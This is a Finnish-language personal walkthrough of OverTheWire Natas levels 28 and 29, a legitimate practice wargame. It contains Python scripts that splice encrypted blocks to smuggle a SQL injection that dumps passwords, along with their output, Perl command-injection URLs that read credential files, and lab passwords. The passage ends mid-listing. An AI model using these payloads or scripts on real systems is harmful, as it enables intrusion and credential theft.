1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a
========================================
input Length: 44 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 45 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98
========================================
input Length: 46 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================
input Length: 47 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4
========================================
input Length: 48 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================
input Length: 49 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 12 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
909a68162c84bd23156c942120760d4b
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 12 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 46 Encrypted query Length: 256

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
31025c86794ef75f6dc14016e3db8db8
4ce5ce96547e1a11895d05ba233f83f1
8c11f169f0d8c2b9ef2739011035e2b0
f39d4d288c0c48b2a531d366e5d2974e
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================



**PIENTÄ käsittely ja checkkausta, ja miksi tämä osuus?**

Tässä on kyse siitä, miten **salaus lohkoo syötteen**, ja miten pieni muutos syötteessä voi vaikuttaa useisiin lohkoihin.

Koska skriptin osuudessa: `data = {"query":"a'*9+' UNION SELECT ALL password from users; #"}` - joka pituus on 46 merkkiä ja se tulosti nyt (alle) sen tulosteensa ja tämä on se injektio, mikä se mukana tuloistaisi.

(TÄMÄ ON SE JONOSSA OLEVA TULOS ja alempi on jälkimmäinen tulostus, sekä näillä on jotakin eroja):

Koska testisyötteitä on monta peräkkäin, ja ne kaikki tulostavat samanlaisen lohkorakenteen. Jos et katso tarkasti input Length -riviä, voi tuntua siltä, että injektio puuttuu. 

- Vaikka syötteen pituus oli sama (46 merkkiä), syötteen sisältö oli eri, ja se riittää muuttamaan salauksen lopputuloksen täysin.
- Ensimmäinen 46-merkkinen syöte saattoi olla: `a'*9+' UNION SELECT ALL password from users; #`
- Toinen 46-merkkinen syöte saattoi olla: `a'*9+' UNION SELECT ALL username from users; #`
- vaikka vain yksi merkki olisi eri, se muuttaa koko salausketjun CBC:ssä
- Tämä kertoo, että syötteen keskiosa on muuttunut — esimerkiksi password vs. username.

========================================
input Length: 46 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================


========================================
input Length: 46 Encrypted query Length: 256

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
31025c86794ef75f6dc14016e3db8db8
4ce5ce96547e1a11895d05ba233f83f1
8c11f169f0d8c2b9ef2739011035e2b0
f39d4d288c0c48b2a531d366e5d2974e
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================


**Seuraavaksi**, tästä samasta skriptistä muutin **10 a:ta**, että katsotaan mitä tapahtuu seuraavaksi ja mitä se tulostaa, että sama jono ja loppu viimeisen syötteestä, sekä tästä sijoitettaan tuohon **cyberchef** sivuston alle ja tehdään munnosta.

Kysyin tekoälyltä apua, kun sitä tulisi vaikeaksi ja tulostuksena viee paljon aikaa, mutta näin tuli ja rakennettua uusiksi vähäsen sitä skriptiä


========================================
input Length: 46 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================
input Length: 47 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4
========================================
input Length: 47 Encrypted query Length: 256

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
4b56ca716b37366b18f3c0f535028c6b
ec98712ce5e2f00d7039564043977092
85ae8c8531360734c5b2a589ead91d94
ca2e1ac5c631a4d96bf2cf8de11e5f18
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970



┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ cat pythonkoodi28-3.py
import requests
from urllib.parse import unquote, quote
import binascii
import base64

# 🔐 Tiedot
url = "http://natas28.natas.labs.overthewire.org/index.php"
username = "natas28"
password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"
block_size = 32

# 🔹 1. Luo salattu lohko "aaaaaaaaaa"
data_clean = {"query": "aaaaaaaaaa"}
res_clean = requests.post(url=url, data=data_clean, auth=(username, password))
encrypted_clean = binascii.hexlify(base64.b64decode(unquote(res_clean.url[60:]))).decode()
block_aaaa = encrypted_clean[block_size:2*block_size]  # toinen lohko
print("[+] Encrypted block for 'aaaaaaaaaa':", block_aaaa)

# 🔹 2. Luo SQL-injektio ja pura lohkot
injection = "a'*10+' UNION SELECT ALL password from users; #"
data_inject = {"query": injection}
res_inject = requests.post(url=url, data=data_inject, auth=(username, password))
encrypted_inject = binascii.hexlify(base64.b64decode(unquote(res_inject.url[60:]))).decode()

# Tulosta alkuperäiset lohkot
print("\n[+] Original injection blocks:")
for i in range(len(encrypted_inject)//block_size):
    print(f"Block {i}: {encrypted_inject[block_size*i:block_size*(i+1)]}")

# 🔹 3. Rakenna uusi salattu kysely
block0 = encrypted_inject[0:block_size]              # alku
block2 = encrypted_inject[2*block_size:3*block_size] # injektion alku

crafted_encrypted = block0 + block_aaaa + block2
crafted_bytes = binascii.unhexlify(crafted_encrypted)
crafted_b64 = base64.b64encode(crafted_bytes).decode()
crafted_url = quote(crafted_b64)

# 🔹 4. Tulosta lopullinen URL-parametri
print("\n[+] Final crafted URL parameter:")
print(crafted_url)

# 🔹 5. (Valinnainen) Testaa palvelimella
test_url = f"{url}?query={crafted_url}"
print("\n[+] Test this URL in browser or with requests:")
print(test_url)



┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi28-3.py            
[+] Encrypted block for 'aaaaaaaaaa': dc84728fdcf89d93751d10a7c75c8cf2

[+] Original injection blocks:
Block 0: 1be82511a7ba5bfd578c0eef466db59c
Block 1: dc84728fdcf89d93751d10a7c75c8cf2
Block 2: 4b56ca716b37366b18f3c0f535028c6b
Block 3: ec98712ce5e2f00d7039564043977092
Block 4: 85ae8c8531360734c5b2a589ead91d94
Block 5: ca2e1ac5c631a4d96bf2cf8de11e5f18
Block 6: bdfa1054ec68515cf96f2a5544591947
Block 7: 904f4b2abf2c2d7686aa72a53151c970

[+] Final crafted URL parameter:
G%2BglEae6W/1XjA7vRm21nNyEco/c%2BJ2TdR0Qp8dcjPJLVspxazc2axjzwPU1Aoxr

[+] Test this URL in browser or with requests:
http://natas28.natas.labs.overthewire.org/index.php?query=G%2BglEae6W/1XjA7vRm21nNyEco/c%2BJ2TdR0Qp8dcjPJLVspxazc2axjzwPU1Aoxr


Tässä alkoi vähitelen tulla ongelmia, että en ymmärrä miten se viimeismmän tuloksensa siis tästä URL parametristä muunnettu URL encode ja siitä liittä `query=` peräänsä, ettei anna vastausta?

Kuitenkin otettiin tämä ylempi skripti python ja toisesta skripty python + copilot apua, että rakentaa toimivaksi, jotta se toimii samalla tavalla. Pientä uutta ominaisuutta:

- rakennettu salattu kysely lohkoista, jotka sisältävät SQL-injektiota
- Säilytetään alkuperäinen header ja footer 
- Poimitaan vain ne lohkot, jotka sisältävät injektion ytimen
- Tulostetaan kaikki välivaiheet selkeästi, jotta näet miten syöte muuttuu





┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ cat pythonkoodi28-3.2.py                    
# tämä on korjattu versio 3.2.

import requests
from urllib.parse import unquote, quote
import binascii
import base64

# 🔐 Tiedot
base_url = "http://natas28.natas.labs.overthewire.org"
index_url = f"{base_url}/index.php"
search_url = f"{base_url}/search.php"
username = "natas28"
password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"
block_size_bytes = 16
block_size_hex = block_size_bytes * 2

# 🔹 1. Luo baseline: tyhjä kysely (10 välilyöntiä)
baseline_query = " " * 10
res_baseline = requests.post(index_url, data={"query": baseline_query}, auth=(username, password))
baseline_b64 = unquote(res_baseline.url.split('=')[1])
baseline_bytes = base64.b64decode(baseline_b64)
baseline_hex = binascii.hexlify(baseline_bytes).decode()

print("[+] Baseline hex:")
print(baseline_hex)
print(f"[+] Total length: {len(baseline_hex)} hex chars ({len(baseline_hex)//block_size_hex} blocks)")

# Poimi header ja footer
header = baseline_bytes[:48]  # 3 lohkoa
footer = baseline_bytes[48:]  # loput

# 🔹 2. Luo SQL-injektio
injection = "         ' UNION ALL SELECT password FROM users;#"
print(f"\n[+] Injection string:\n{injection}")
print(f"[+] Injection length: {len(injection)} characters")

res_inject = requests.post(index_url, data={"query": injection}, auth=(username, password))
inject_b64 = unquote(res_inject.url.split('=')[1])
inject_bytes = base64.b64decode(inject_b64)
inject_hex = binascii.hexlify(inject_bytes).decode()

print("\n[+] Injection hex:")
print(inject_hex)
print(f"[+] Total length: {len(inject_hex)} hex chars ({len(inject_hex)//block_size_hex} blocks)")

# 🔹 3. Tulosta lohkot
print("\n[+] Injection blocks:")
inject_blocks = []
for i in range(len(inject_bytes) // block_size_bytes):
    block = inject_bytes[i*block_size_bytes:(i+1)*block_size_bytes]
    inject_blocks.append(block)
    print(f"Block {i}: {binascii.hexlify(block).decode()}")

# 🔹 4. Poimi injektion ytimen lohkot (lohko 3–6)
middle = b''.join(inject_blocks[3:7])  # voit säätää lohkoja tarpeen mukaan

# 🔹 5. Rakenna lopullinen salattu kysely
final_bytes = header + middle + footer
final_b64 = base64.b64encode(final_bytes).decode()
final_url = quote(final_b64, safe='')

print("\n[+] Final crafted URL parameter:")
print(final_url)

# 🔹 6. Testaa palvelimella
print("\n[+] Sending final request to search.php...")
res_final = requests.get(search_url, params={"query": final_b64}, auth=(username, password))
print("\n[+] Server response:")
print(res_final.text)



**Tämä on se vastaus:**

┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi28-3.2.py
[+] Baseline hex:
1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf22d94c337a938b39110793f6cd8c49b1b738a5ffb4a4500246775175ae596bbd6f34df339c69edce11f6650bbced62702
[+] Total length: 160 hex chars (5 blocks)

[+] Injection string:
         ' UNION ALL SELECT password FROM users;#
[+] Injection length: 49 characters

[+] Injection hex:
1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf23917a542aa9c15d450a53927be3860e5574d86bbdcff747464514968f43c92401f26b6ae470f5fc111eb274c0c213e95c0db24b5274ba212d1b06e990c8db29f48799a07b1d29b5982015c9355c2e00eaded9bdbaca6a73b71b35a010d2c4c57
[+] Total length: 256 hex chars (8 blocks)

[+] Injection blocks:
Block 0: 1be82511a7ba5bfd578c0eef466db59c
Block 1: dc84728fdcf89d93751d10a7c75c8cf2
Block 2: 3917a542aa9c15d450a53927be3860e5
Block 3: 574d86bbdcff747464514968f43c9240
Block 4: 1f26b6ae470f5fc111eb274c0c213e95
Block 5: c0db24b5274ba212d1b06e990c8db29f
Block 6: 48799a07b1d29b5982015c9355c2e00e
Block 7: aded9bdbaca6a73b71b35a010d2c4c57

[+] Final crafted URL parameter:
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbV02Gu9z%2FdHRkUUlo9DySQB8mtq5HD1%2FBEesnTAwhPpXA2yS1J0uiEtGwbpkMjbKfSHmaB7HSm1mCAVyTVcLgDnOKX%2FtKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC

[+] Sending final request to search.php...

[+] Server response:
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas28", "pass": "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" };</script></head>
<body>
<!-- morla/10111 -->
<h1>natas28</h1>
<style>
ul {
  margin: 1em 0;
  padding: 0 0 0 40px;
}

li {
  margin: 1em 0;
}
</style>
<div id="content">
<h2> Whack Computer Joke Database</h2><ul><li>31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns</li></ul>
</div>
</body>
</html>



## muita tekstaukset


┌──(kali㉿kali)-[~]
└─$ curl -s -X POST -d "query=test" -u natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj "http://natas28.natas.labs.overthewire.org/search.php"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas28", "pass": "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" };</script></head>
<body>
<!-- morla/10111 -->
<h1>natas28</h1>
<style>
ul {
  margin: 1em 0;
  padding: 0 0 0 40px;
}

li {
  margin: 1em 0;
}
</style>
<div id="content">
<br />
<b>Notice</b>:  Trying to access array offset on value of type bool in <b>/var/www/natas/natas28/search.php</b> on line <b>59</b><br />
Zero padding found instead of PKCS#7 padding  


## toinen python koodi

otettu toinen skripti apua ja vihjettä, mutta siinä oli jotakin väärin kirjoitettu ja tätä korjasi copilot niin apua sai. 

ongelmana miksi tämä toimii entä ne aikaisemamt ja mikä eroana siin on ja missä oli virhe edes?

import requests
import urllib
import base64

conn_url = "http://natas28.natas.labs.overthewire.org"
conn = requests.Session()
conn.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

# First we generate a baseline for the header/footer
data = {'query': 10 * ' '}
resp = conn.post(conn_url, data=data)
meat = urllib.parse.unquote(resp.url.split('=')[1])
meat = base64.b64decode(meat.encode('utf-8'))
header = meat[:48]
footer = meat[48:]

# SQL injection payload
sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
data = {'query': sqli}
resp = conn.post(conn_url, data=data)
exploit = urllib.parse.unquote(resp.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# Calculating the size of the payload
nblocks = len(sqli) - 10
while nblocks % 16 != 0:
    nblocks += 1
nblocks = int(nblocks / 16)

# Constructing final ciphertext
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)

# Sending final request
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
resp = conn.get(search_url, params={"query": final_ciphertext})
print(resp.text)



perus otin toisen python skriptin niin alkoi pelittää ja miksi??

┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi28-test1.py   
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas28", "pass": "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" };</script></head>
<body>
<!-- morla/10111 -->
<h1>natas28</h1>
<style>
ul {
  margin: 1em 0;
  padding: 0 0 0 40px;
}

li {
  margin: 1em 0;
}
</style>
<div id="content">
<h2> Whack Computer Joke Database</h2><ul><li>31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns</li></ul>
</div>
</body>
</html>




## mini yhteenveto 

Tämä on vain pieni yhteenveto koskien tästä harjoituksesta


Tässä haasteessa oli tarkoitus murtaa salattu URL-parametri, joka sisältää käyttäjän syötteen `(query)`. Palvelin salaa syötteen ja liittää sen URL:iin, ja kun käyttäjä lähettää sen takaisin, palvelin purkaa sen ja suorittaa SQL-kyselyn.


🔐 Salausmenetelmä:
- Käytössä oli CBC-salaus (Cipher Block Chaining), ei ECB.
- CBC jakaa syötteen lohkoihin, ja jokainen lohko vaikuttaa seuraavaan.
- Jos lohkoja muokkaa oikein, voi rakentaa uuden salatun kyselyn, vaikka ei tiedä alkuperäistä avainta.


🧨 Hyökkäyksen idea:
- Luotiin turvallinen alku (header), joka ei riko syntaksia.
- Poimittiin injektion lohkot (esim. ' UNION SELECT password FROM users;#).
- Korvattiin osa lohkoista ja rakennettiin uusi salattu kysely.
- Lopuksi base64-enkoodattiin ja URL-enkoodattiin parametri, ja lähetettiin se palvelimelle.


Tässä haasteessa opin, miten CBC-salaus toimii lohkoittain ja miten salattua URL-parametria voi manipuloida ilman salausavainta. Rakensin uuden kyselyn korvaamalla lohkoja, ja näin sain SQL-injektion toimimaan. Vaikka en aluksi ymmärtänyt kaikkea, opin käytännössä miten lohkot vaikuttavat toisiinsa ja miten salattua dataa voi hyödyntää hyökkäyksessä. Tämä oli hyvä esimerkki siitä, miten salaus ja web-haavoittuvuudet voivat yhdistyä.



**kuitenkin**

Koskien sitä skriptiä kun se runnaa ja rakentaa sen **input of length** jotakin bittiä ja tulostaakseen sitä merkki määrää.

Tästä tarkistettu kuitenkin useampi kerta sitä luku:

```
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
3917a542aa9c15d450a53927be3860e5
574d86bbdcff747464514968f43c9240
1f26b6ae470f5fc111eb274c0c213e95
c0db24b5274ba212d1b06e990c8db29f
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57
```

- operaatiota: `from hex` -> `to base64` -> `URL encode`.

output:
- `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPI5F6VCqpwV1FClOSe%2BOGDlV02Gu9z%2FdHRkUUlo9DySQB8mtq5HD1%2FBEesnTAwhPpXA2yS1J0uiEtGwbpkMjbKfSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D`

Joko yhteen tai erikseen kuitenki se cyberchef sivusto ei tykkää siitä ja sama oiskin tuloksena en tiedä vielä ymmärrä miksi ei anna just mitä **python skripti antaakaan**. ECB-salaus ei sekoita lohkoja — se salaa jokaisen erikseen. Mutta **base64 koodaa koko yhdistelmän yhtenä datana**.



### linkistä lisäteoriaa ja apua

https://learnhacking.io/overthewire-natas-level-28-walkthrough/

https://the-dark-lord.medium.com/natas-wargames-16-30-fbde4edd41d4

https://axcheron.github.io/writeups/otw/natas/#natas-28-solution

https://anyafachri.medium.com/ebc-block-splicing-attack-for-successful-sql-injection-natas28-overthewire-write-up-6e83eb1815ac

https://www.youtube.com/watch?v=oWmfYgCYmCc


https://blog.sudarshandevkota.com.np/overthewire-natas-walkthrough 

https://techyrick.com/natas-overthewire-writeup-otw/


---


# natas 29 - START HERE;

natas29 : 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

http://natas29.natas.labs.overthewire.org



Perus avatessa tyhjä sivusto, mutta on sellainen valikko ja ihme teksti kuin: `c4n Y0 h4z s4uc3?` - *can you ... jotakin sauce?*

Valikosta löytyy muutama vaihtoehtoa ja tulostuksena tulee sellainen ascii art näköinen kuvio ja jokaiselta alta löytyy joku pitkä koodi pätkä / Linux näköinen terminaali rakennettu pohjana, että voi olla mukana erilaisia kommentteja. 

Jokaisen avatun tai vaihtaa ASCII arts mikälie niin vaihtuu URL parametri ja tämä yksi esim.

- `http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+4`

Mahtaako olla jotakin *komentojen injektio* tasoa tällä hetkellä? Sekä tässä tasossa ei ole mainitu tuota **view-source.html** koodia eli html php koodia yhtään.

## Leetspeak - lyhyesti

Ainoastaan vihjeenä näissä ASCII art näkyvillä toistuu "P3RL UND3 GROUND" - ja kultuuria tätä kutsutaan **Leetspeak**. Leetspeak tarkoittaa lähtöisin oleva kirjoitustyyli, jossa yleensä käytetään isoja ja pieniä kirjaimia sekaisin, ja joskus korvataan osa kirjaimista muilla merkeillä, etenkin numeroilla ja vähä kuin internet slangia.

Vähä kuin kirjoitustapa, jossa korvataan kirjaimia numeroilla tai erikoismerkeillä, jotka näyttävät samalta kuin alkuperäiset kirjaimet. Se sai alkunsa hakkeri- ja nettiyhteisöissä 80- ja 90-luvuilla vähän kuin salakielenä tai sisäpiirin juttuna.


Pientä esimerkkiä **Leetspeak** kuin A - 4 tai @ , E on kuin 3, I (i) - 1 tai ! ja 5 on kuin S tai $. 


kevyt leet malli:
- s3cr3ts - secrets
- password - p4ssw0rd
- 1nt3rn3t - internet

Toinen mini esim. 4 toimii kuin äänityksellä for/four - usein tarkoitus on näyttää kekseliäältä, pelimäiseltä tai vähän trollaavalta.

Leetspeak - mukaan on usein käytetäviä eri vahvuuksia tai ns "tyylillä", jotka voida epävirallisesti jaotella *normi leetspeak* ja *vahva leetspeak* ja kolmantena, *oma tyyli*. Oma tyyli tarkoittaa voi itse rakentaa oman fiiliksen mukaan ja Leetspeak:illä ei ole mitään sääntöä tarkoituksena on enemmänkin näyttää "coolilta" tai tunnistaa kuuluvansa tiettyyn nettiyhteisöön tai huumorityyliin.


Esimerkit:
- elite hackers - 3|173 H4(k3r
- password - P@55\/\/0|2Ð

## pientä teoria ja harjoituksen idea


Tässä tapahtuu Perl komento injektiota eli Linux termistöä mm. pwd , ls, cat ja jne, mutta tässä ideana käyttää vaihtoehtoisia erikoismerkien käyttöä ja muita komentojen liitämistä suoritettavaksi komentoon. 

Etusivustossa on vaihtoehto ikkunna, jossa voi valita n. 5 eri "Pearl under ground" - niin se vaihtaa sen näkymänsä ja sama URL parametrikin muuttuu. Tämä yksi nistä, mutta vain perässä se luku muuttuu:


```
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+2
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+5
```

Tässä Perl vähä yrittä laittaa `file=` jotakin linux terminaalia ja sitä yleistä komentoa ja testat toimiiko. Eikä tässä kauheasti johtolankaakaan ole tarjolla, mutta yksi mitä on testattu on tiedoston polku eli lisätty perään: `../../../../../../../../etc/passwd` - ja tulostakaan ei annettu.


Putkimerkki `|` on Unix/Linux shellissä erikoismerkki, joka putkittaa komennon tulosteen seuraavalle komennolle. Kuitenkin jonkinlainen merkki/erikoismerkki tai muiden komentojen liittämistä suoritettavaa komentoa.


Laitoin tällaisen URL parametriin perään kuin `|ls%00` -> `http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00`

Tuloksena siellä tuli näin selaimeen: *index.pl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt* 


Tämä `|ls%00` - tarkoittaa Null-byte eli `%00` tai `\x00` (ASCII-arvo 0) on klassinen temppu monissa injektiohyökkäyksissä, erityisesti vanhemmissa järjestelmissä tai ohjelmointikielissä kuten C/C++ tai PHP:n vanhoissa versioissa. Tämä voi johtaa siihen, että loput syötteestä jätetään huomiotta, mikä voi ohittaa suodatuksia tai rajoituksia.

- Jos syöttäisin tämän komennon curl komentoon niin pitää rakentaa se URL encode prosessi, jotta se ymmärtää.


**Eteenpäin**
Eli todennäköisesti tämä `|ls%00` antoi vihjeen että putkesta eteenpäin syötettään Linux termistöjä kuten ls , pwd ja jne.

Kokeillaan: `http://natas29.natas.labs.overthewire.org/index.pl?file=|lsl` - tämä ei antanut mitään - mutta testattu kuitenkin 


**pwd** vuoro - `http://natas29.natas.labs.overthewire.org/index.pl?file=|pwd%00` ja toimii.

Nyt pitäisi saada toi Linux polku sijoitettua tähän URL parametri perään, jotta se ymmärtää sen ja löytääkseen seuraavan levelin salasanansa.


**whoami** komento - `http://natas29.natas.labs.overthewire.org/index.pl?file=|%20whoami%00` - tämä toimi



**cat** komento - `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/natas_webpass/natas30%00`

Tuloksena: "meeeeeep!" - jaa mitä ihmettä. Se, että saat **"meep!"-viestin**, tarkoittaa että **palvelin havaitsee injektion ja estää sen jollain tavalla**. Tämä viittaa siihen, että `index.pl`-skriptissä on suodatuslogiikka, joka estää tiettyjä komentoja tai merkkejä — kuten `cat`, `|`, tai tiedostopolkuja.



Seuraavaksi otettaan **base64** käyttöön ja pientä temppu suodatuksen kiertämiseksi. 

Kertauksena: **Base64** on tekstin koodaustapa, jota käytetään erityisesti silloin, kun binääristä dataa (esim. kuvia, tiedostoja tai salattua sisältöä) täytyy muuntaa tekstimuotoon, jotta se voidaan helposti siirtää tai tallentaa tekstipohjaisissa järjestelmissä (kuten sähköposteissa tai URL-osoitteissa).


Kokeilin sijoittaa tällaisen sanansa URL parametrin perään: `| cat index.pl | base64%00` - eli `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%20|%20base64%00` - tuloksena tulostui jotakin ylimääräistä ja tuntematonta tekstiä.


Voi olla jotakin base64-encode pitkää lorem ipsum tekstiä (lyhyest kopsattuna: IyEvdXNyL2Jpbi9wZXJsCnVzZSBDR0kgcXcoOnN0YW5kYXJkKTsKCnByaW50IDw8RU5EOwpDb250 ) - ja sivuston mukaan oikea klikkaus estetty - et jouduttaan käyttää CTRL + C

Laitettu cyberchef sivuston alle ja katsotaan mitä se tulostaa ja cyberchef mukaan **From base 64** ja output tulostuu html koodi - ja voi olla tämä on jotakin **index.pl** kontekstiä.

```
#!/usr/bin/perl
use CGI qw(:standard);

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
